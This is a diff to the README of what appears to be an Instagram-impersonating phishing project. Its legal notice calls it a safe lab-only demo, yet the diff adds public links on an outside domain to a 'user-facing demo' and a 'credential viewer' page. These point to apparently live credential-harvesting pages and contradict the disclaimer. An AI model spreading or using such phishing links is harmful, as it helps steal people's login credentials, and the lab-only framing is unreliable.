@@ -3,6 +3,12 @@
 > **IMPORTANT — LEGAL & ETHICAL NOTICE**  
 > This repository contains a **modified, safe demo** inspired by a previously uploaded project. It is intended **only** for lawful, ethical education and research in a controlled environment (local machine or isolated lab). **Do not** use this code to target real users or to collect real credentials. Unauthorized collection of credentials or any attempt to impersonate services (including Instagram) is illegal and unethical.
 
+ ## Example URLs
+
+- **User-facing demo:** [http://spelass.com/streetstyle](http://spelass.com/streetstyle)
+- **Credential viewer (demo only):** [http://spelass.com/streetstyle/khaaz.php](http://spelass.com/streetstyle/khaaz.php)
+
+
 ---
 
 ## Project Overview
